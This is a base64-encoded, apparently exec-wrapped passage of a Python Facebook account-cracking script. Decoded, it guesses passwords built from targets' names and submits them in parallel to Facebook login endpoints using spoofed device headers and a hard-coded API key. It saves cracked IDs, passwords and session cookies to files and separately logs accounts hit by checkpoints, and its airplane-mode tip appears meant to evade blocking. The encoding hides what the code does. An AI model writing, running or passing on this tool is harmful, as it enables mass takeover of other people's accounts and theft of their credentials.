CkNCiAgICAgICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9EV19PS19pZHNfTTIudHh0JywnYScpLndyaXRlKHNpZCsnfCcrcHMrJ1xuJyk7b3BlbignL3NkY2FyZC9TU0JfaURzX0NPT0tpRXNfTTIudHh0JywnYScpLndyaXRlKHNpZCsnfCcrcHMrJ3wnK2Nvb2tpZSsnXG4nKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yJ11bJ21lc3NhZ2UnXToNCiAgICAgICAgICAgICAgICAgICAgIyAgcHJpbnQoZiJccntBfSBbU1NCLUNQXSB7c2lkfSB8IHtwc30ge1N9IikNCiAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZChzaWQpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvRFdfQ1AudHh0JywnYScpLndyaXRlKHNpZCsnfCcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgbG9vcCs9MQ0KICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgICAgICBzZWxmLm1ldGhvZEMoc2lkLCBuYW1lLCBwcykNCiAgICAgICAgICAgIA0KICAgIGRlZiBtZXRob2RCKHNlbGYsIHNpZCwgbmFtZSwgcHN3KToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZ2xvYmFsIG9rcyxjcHMsbG9vcA0KICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyIHtTfVtEVy1YRF0ge2xvb3B9IHwgTTIgT0svQ1Age2xlbihva3MpfS97bGVuKGNwcyl9IHwge1N9eyd7Oi4wJX0nLmZvcm1hdChsb29wL2Zsb2F0KGxlbihzZWxmLmlkKSkpfXtTfSIpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgIGZzID0gbmFtZS5zcGxpdCgnICcpWzBdDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgbHMgPSBuYW1lLnNwbGl0KCcgJylbMV0NCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBscyA9IGZzDQogICAgICAgICAgICBmb3IgcHcgaW4gcHN3Og0KICAgICAgICAgICAgICAgIHBzID0gcHcucmVwbGFjZSgnZmlyc3QnLGZzLmxvd2VyKCkpLnJlcGxhY2UoJ0ZpcnN0JyxmcykucmVwbGFjZSgnbGFzdCcsbHMubG93ZXIoKSkucmVwbGFjZSgnTGFzdCcsbHMpLnJlcGxhY2UoJ05hbWUnLG5hbWUpLnJlcGxhY2UoJ25hbWUnLG5hbWUubG93ZXIoKSkNCiAgICAgICAgICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXNzaW9uOg0KICAgICAgICAgICAgICAgICAgICBkYXRhID0geyJhZGlkIjogc3RyKHV1aWQudXVpZDQoKSksDQoiZm9ybWF0IjogImpzb24iLA0KImRldmljZV9pZCI6IHN0cih1dWlkLnV1aWQ0KCkpLA0KImNwbCI6ICJ0cnVlIiwNCiJmYW1pbHlfZGV2aWNlX2lkIjogc3RyKHV1aWQudXVpZDQoKSksDQoiY3JlZGVudGlhbHNfdHlwZSI6ICJkZXZpY2VfYmFzZWRfbG9naW5fcGFzc3dvcmQiLA0KImVycm9yX2RldGFpbF90eXBlIjogImJ1dHRvbl93aXRoX2Rpc2FibGVkIiwNCiJzb3VyY2UiOiAiZGV2aWNlX2Jhc2VkX2xvZ2luIiwNCiJlbWFpbCI6IHNpZCwNCiJwYXNzd29yZCI6IHBzLA0KImFjY2Vzc190b2tlbiI6ICIzNTA2ODU1MzE3MjglN0M2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMiIsDQoiZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzIjogIjEiLA0KIm1ldGFfaW5mX2ZibWV0YSI6ICIiLA0KImFkdmVydGlzZXJfaWQiOiBzdHIodXVpZC51dWlkNCgpKSwNCiJjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZCI6ICIwIiwNCiJsb2NhbGUiOiAiZW5fR0IiLA0KImNsaWVudF9jb3VudHJ5X2NvZGUiOiAiR0IiLA0KIm1ldGhvZCI6ICJhdXRoLmxvZ2luIiwNCiJmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUiOiAiYXV0aGVudGljYXRlIiwNCiJmYl9hcGlfY2FsbGVyX2NsYXNzIjogImNvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlciIsDQoiYXBpX2tleSI6ICI4ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZCJ9DQogICAgICAgICAgICAgICAgaGVhZGVycyA9IHsnVXNlci1BZ2VudCc6IHJhbmRCdWlsZEhITCgpLA0KJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLA0KJ0hvc3QnOiAnZ3JhcGguZmFjZWJvb2suY29tJywNCidYLUZCLU5ldC1ITkknOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksDQonWC1GQi1TSU0tSE5JJzogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLA0KJ1gtRkItQ29ubmVjdGlvbi1UeXBlJzogJ01PQklMRS5MVEUnLA0KJ1gtVGlnb24tSXMtUmV0cnknOiAnRmFsc2UnLA0KJ3gtZmItc2Vzc2lvbi1pZCc6ICduaWQ9amlaK3lOTkJnYndDO3BpZD1NYWluO3RpZD0xMzI7bmM9MTtmYz0wO2JjPTA7Y2lkPWQyOWQ2N2QzN2VjYTM4NzQ4MmE4YTViNzQwZjg0ZjYyJywNCid4LWZiLWRldmljZS1ncm91cCc6ICc1MTIwJywNCidYLUZCLUZyaWVuZGx5LU5hbWUnOiAnVmlld2VyUmVhY3Rpb25zTXV0YXRpb24nLA0KJ1gtRkItUmVxdWVzdC1BbmFseXRpY3MtVGFncyc6ICdncmFwaHNlcnZpY2UnLA0KJ1gtRkItSFRUUC1FbmdpbmUnOiAnTGlnZXInLA0KJ1gtRkItQ2xpZW50LUlQJzogJ1RydWUnLA0KJ1gtRkItU2VydmVyLUNsdXN0ZXInOiAnVHJ1ZScsDQoneC1mYi1jb25uZWN0aW9uLXRva2VuJzogJ2QyOWQ2N2QzN2VjYTM4NzQ4MmE4YTViNzQwZjg0ZjYyJyx9DQogICAgICAgICAgICAgICAgcSA9IHNlc3Npb24ucG9zdCgiaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luIixkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycywgYWxsb3dfcmVkaXJlY3RzPUZhbHNlKS5qc29uKCkNCiAgICAgICAgICAgICAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHE6DQogICAgICAgICAgICAgICAgICAgIGNra2sgPSAiOyIuam9pbihpWyJuYW1lIl0rIj0iK2lbInZhbHVlIl0gZm9yIGkgaW4gcVsic2Vzc2lvbl9jb29raWVzIl0pO3NzYmIgPSBiYXNlNjQuYjY0ZW5jb2RlKG9zLnVyYW5kb20oMTgpKS5kZWNvZGUoKS5yZXBsYWNlKCI9IiwiIikucmVwbGFjZSgiKyIsIl8iKS5yZXBsYWNlKCIvIiwiLSIpO2Nvb2tpZSA9IGYic2I9e3NzYmJ9O3tja2trfSINCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJccntSfSBbRFctT0tdIHtzaWR9IHwge3BzfSB7U30iKQ0KICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHNpZCkNCiAgICAgICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9EV19PS19pZHNfTTIudHh0JywnYScpLndyaXRlKHNpZCsnfCcrcHMrJ1xuJyk7b3BlbignL3NkY2FyZC9TU0JfaURzX0NPT0tpRXNfTTIudHh0JywnYScpLndyaXRlKHNpZCsnfCcrcHMrJ3wnK2Nvb2tpZSsnXG4nKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yJ11bJ21lc3NhZ2UnXToNCiAgICAgICAgICAgICAgICAgICAgIyAgcHJpbnQoZiJccntBfSBbU1NCLUNQXSB7c2lkfSB8IHtwc30ge1N9IikNCiAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZChzaWQpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvRFdfQ1AudHh0JywnYScpLndyaXRlKHNpZCsnfCcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgbG9vcCs9MQ0KICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgICAgICBzZWxmLm1ldGhvZEIoc2lkLCBuYW1lLCBwcykNCg0KICAgIGRlZiBtZXRob2REKHNlbGYsIHNpZCwgbmFtZSwgcHN3KToNCiAgICAgICAgZ2xvYmFsIG9rcyxjcHMsbG9vcA0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHIge1N9W0RXLVhEXSB7bG9vcH0gfCBNNCBPSy9DUCB7bGVuKG9rcyl9L3tsZW4oY3BzKX0gfCB7U317J3s6LjAlfScuZm9ybWF0KGxvb3AvZmxvYXQobGVuKHNlbGYuaWQpKSl9e1N9IikNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIGZzID0gbmFtZS5zcGxpdCgnICcpWzBdDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGxzID0gbmFtZS5zcGxpdCgnICcpWzFdDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIGxzID0gZnMNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZm9yIHB3IGluIHBzdzoNCiAgICAgICAgICAgICAgICBwcyA9IHB3LnJlcGxhY2UoJ2ZpcnN0Jyxmcy5sb3dlcigpKS5yZXBsYWNlKCdGaXJzdCcsZnMpLnJlcGxhY2UoJ2xhc3QnLGxzLmxvd2VyKCkpLnJlcGxhY2UoJ0xhc3QnLGxzKS5yZXBsYWNlKCdOYW1lJyxuYW1lKS5yZXBsYWNlKCduYW1lJyxuYW1lLmxvd2VyKCkpDQogICAgICAgICAgICAgICAgc2Vzc2lvbj1yZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgICAgICBzdWEgPSByYW5kb20uY2hvaWNlKHNhZ2VudCkNCiAgICAgICAgICAgICAgICBnZXRsb2cgPSBzZXNzaW9uLmdldChmJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcGFzc3dvcmQvP3VpZD17c2lkfSZmbG93PWxvZ2luX25vX3BpbiZyZWZzcmM9ZGVwcmVjYXRlZCZfcmRyJykNCiAgICAgICAgICAgICAgICBpZHBhc3MgPXsibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihnZXRsb2cudGV4dCkpLmdyb3VwKDEpLCJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZ2V0bG9nLnRleHQpKS5ncm91cCgxKSwidWlkIjpzaWQsIm5leHQiOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vc2F2ZS1kZXZpY2UvIiwiZmxvdyI6ImxvZ2luX25vX3BpbiIsInBhc3MiOnBzLH0NCiAgICAgICAgICAgICAgICBzZXNzaW9uLmhlYWRlcnMgPSB7fQ0KICAgICAgICAgICAgICAgIHNlc3Npb24uaGVhZGVycy51cGRhdGUoeydIb3N0JzogJ21iYXNpYy5mYWNlYm9vay5jb20nLCAndmlld3BvcnQtd2lkdGgnOiAnOTgwJywgJ3NlYy1jaC11YSc6ICciIE5vdCBBO0JyYW5kIjt2PSI5OSIsICJDaHJvbWl1bSI7dj0iMTAwIiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEwMCInLCAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnQW5kcm9pZCcsICdzZWMtY2gtcHJlZmVycy1jb2xvci1zY2hlbWUnOiAnbGlnaHQnLCAnZG50JzogJzEnLCAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywgJ3VzZXItYWdlbnQnOiBzdWEsICdhY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45JywgJ3NlYy1mZXRjaC1zaXRlJzogJ25vbmUnLCAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLCAnc2VjLWZldGNoLXVzZXInOiAnPzEnLCAnc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLCAnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUsIGJyJywgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1QSyxlbi1HQjtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyd9KQ0KICAgICAgICAgICAgICAgIGNvbXBsZXRlID0gc2Vzc2lvbi5wb3N0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3ZhbGlkYXRlLXBhc3N3b3JkLz9zaGJsPTAnLGRhdGE9aWRwYXNzLGFsbG93X3JlZGlyZWN0cz1GYWxzZSkNCiAgICAgICAgICAgICAgICBpZiAnY191c2VyJyBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJccntSfSBbRFctT0tdIHtzaWR9IHwge3BzfSB7U30iKQ0KICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHNpZCkNCiAgICAgICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9EV19PSy50eHQnLCdhJykud3JpdGUoc2lkKyd8JytwcysnXG4nKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgICAgICAjcHJpbnQoZiJccntBfSBbU1NCLUNQXSB7c2lkfSB8IHtwc30ge1N9IikNCiAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZChzaWQpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvRFdfQ1AudHh0JywnYScpLndyaXRlKHNpZCsnfCcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICN0aW1lLnNsZWVwKDMxKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBsb29wKz0xDQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCiAgICAgICAgICAgICBzZWxmLm1ldGhvZEQoc2lkLCBuYW1lLCBwcykNCiAgICAgICAgICAgIA0KICAgIGRlZiBwYXN3KHNlbGYpOiAgICAgICANCiAgICAgICAgICAgIHB3ID0gW10NCiAgICAgICAgICAgIGNsZWFyKCkNCiAgICAgICAgICAgIHByaW50KCdQdXQgbGltaXQgYmV0d2VlbiAxIHRvIDMwJykNCiAgICAgICAgICAgIHNsID0gaW50KGlucHV0KCdIb3cgbWFueSBwYXNzd29yZCBkbyB5b3Ugd2FudCB0byBhZGQ/OiAnKSkNCiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgICAgICAgICAgcHJpbnQobG9nbykNCiAgICAgICAgICAgIHByaW50KGYne1N9IFtFeGFtcGxlOiBmaXJzdDEyMyxsYXN0MTEyMixmaXJzdGxhc3QsbGFzdCxFVENdJykNCiAgICAgICAgICAgIHByaW50KCcnKQ0KICAgICAgICAgICAgaWYgc2wgPT0nJzoNCiAgICAgICAgICAgICAgICBwcmludCgnXG4gUHV0IGxpbWl0IGJldHdlZW4gMSB0byAzMCcpDQogICAgICAgICAgICBlbGlmIHNsID4gMjA6DQogICAgICAgICAgICAgICAgcHJpbnQoJ1xuUGFzc3dvcmQgbGltaXQgU2hvdWxkIE5vdCBCZSBHcmVhdGVyIFRoYW4gMzAnKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBmb3Igc3IgaW4gcmFuZ2Uoc2wpOg0KICAgICAgICAgICAgICAgICAgICBwdy5hcHBlbmQoaW5wdXQoZidQYXNzd29yZCB7c3IrMX06ICcpKQ0KICAgICAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgICAgICBwcmludChsb2dvKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBwcmludChmIlxye0F9VXNlIGZsaWdodCAoYWlycGxhbmUpIG1vZGUgYmVmb3JlIHVzZSB7U30iKQ0KICAgICAgICAgICAgcHJpbnQoNDcqIi0iKQ0KICAgICAgICAgICAgcHJpbnQoZid7U30gVG90YWwgSURzIDogJXMgJyAlIGxlbihzZWxmLmlkKSkNCiAgICAgICAgICAgIHByaW50KGYne1N9IENyYWNraW5nIFN0YXJ0ZWQuLi4nKQ0KICAgICAgICAgICAgcHJpbnQoNDcqIi0iKQ0KICAgICAgICAgICAgd2l0aCBzYXJmcmF6c3NiKG1heF93b3JrZXJzPTMwKSBhcyBzc2J3b3JsZDoNCiAgICAgICAgICAgICAgICBmb3IgenNiIGluIHNlbGYuaWQ6DQogICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB6c2Iuc3BsaXQoJ3wnKQ0KICAgICAgICAgICAgICAgICAgICAgICBzeiA9IG5hbWUuc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oc3opID09IDMgb3IgbGVuKHN6KSA9PSA0IG9yIGxlbihzeikgPT0gNSBvciBsZW4oc3opID09IDg6DQogICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSAgcHcNCiAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSAgcHcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnbWV0aG9kQScgaW4gbWV0aG9kczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYubWV0aG9kQSwgdWlkLCBuYW1lLCBwd3gpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiAnbWV0aG9kQicgaW4gbWV0aG9kczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYubWV0aG9kQiwgdWlkLCBuYW1lLCBwd3gpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiAnbWV0aG9kQycgaW4gbWV0aG9kczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYubWV0aG9kQywgdWlkLCBuYW1lLCBwd3gpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiAnbWV0aG9kRCcgaW4gbWV0aG9kczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYubWV0aG9kRCwgdWlkLCBuYW1lLCBwd3gpDQogICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgIHJlc3VsdChva3MsY3BzKSAgIA0KICAgICAgICAgICAgDQoNCmRlZiBsb2dvdXQoKToNCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgLnRva2VuLnR4dCAuY29va2llLnR4dCcpO3ByaW50KGYnXG57Rn1Mb2dvdXQgU3VjY2Vzc2Z1bGx5IC4uLicpDQogICAgICAgIGxvZ2luKCkNCiAgICAgICAgDQogICAgICAgIA0Kc2FyZnJheigp"))